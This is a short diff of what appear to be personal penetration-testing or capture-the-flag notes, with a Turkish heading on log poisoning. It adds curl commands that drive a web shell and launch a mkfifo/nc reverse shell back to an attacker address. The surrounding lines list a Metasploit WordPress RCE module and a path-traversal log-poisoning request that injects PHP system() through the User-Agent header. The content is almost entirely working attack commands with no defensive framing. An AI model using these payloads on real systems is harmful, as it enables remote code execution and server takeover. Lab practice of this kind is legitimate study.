@@ -458,12 +458,22 @@ PAYLOAD
 
 wordpress backdoor >>>    exploit/multi/http/wp_crop_rce
 
+curl -s 'http://10.10.74.25/assets/index.php?cmd=id'
+
+curl -s 'http://10.10.74.25/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.11.72.22 443 >/tmp/f'
+
 
 #########################################################################
 günlük zehirlemsi
 
+
+
+
+
 curl 
 ‘http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././var/log/apache2/access.log’ -H ‘User-Agent: <?php system($_GET[‘cmd’]); ?>’
+
+
 
 
 mafialive.thm/test.php?view     
